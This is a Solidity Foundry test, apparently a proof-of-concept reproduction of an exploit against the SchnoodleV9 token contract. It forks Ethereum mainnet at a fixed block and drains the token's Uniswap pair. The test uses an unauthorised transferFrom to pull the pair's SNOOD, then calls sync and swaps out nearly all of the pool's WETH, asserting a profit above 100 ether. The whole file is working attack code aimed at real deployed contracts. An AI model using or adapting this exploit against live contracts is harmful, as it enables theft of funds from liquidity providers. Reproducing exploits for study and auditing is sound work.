// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/SchnoodleV9.sol";
import "../src/interfaces/IUniswapV2Pair.sol";
import "../src/interfaces/IWETH9.sol";

contract SnoodHack is Test {
    SchnoodleV9 snood = SchnoodleV9(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
    IUniswapV2Pair uniswap = IUniswapV2Pair(0x0F6b0960d2569f505126341085ED7f0342b67DAe);
    IWETH9 weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testSchnoodleHack() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 14983600);
        console.log("Your Starting WETH Balance:", weth.balanceOf(address(this)));
        
        uint uniswapSnoodBal = snood.balanceOf(address(uniswap));
        snood.transferFrom(address(uniswap), address(this), uniswapSnoodBal - 1);

        uniswap.sync();

        uint uniswapEthBal = weth.balanceOf(address(uniswap));
        snood.transfer(address(uniswap), uniswapSnoodBal - 1);
        uniswap.swap(uniswapEthBal - 1, 0, address(this), bytes(''));

        console.log("Your Final WETH Balance:", weth.balanceOf(address(this)));
        assert(weth.balanceOf(address(this)) > 100 ether);
    }
}
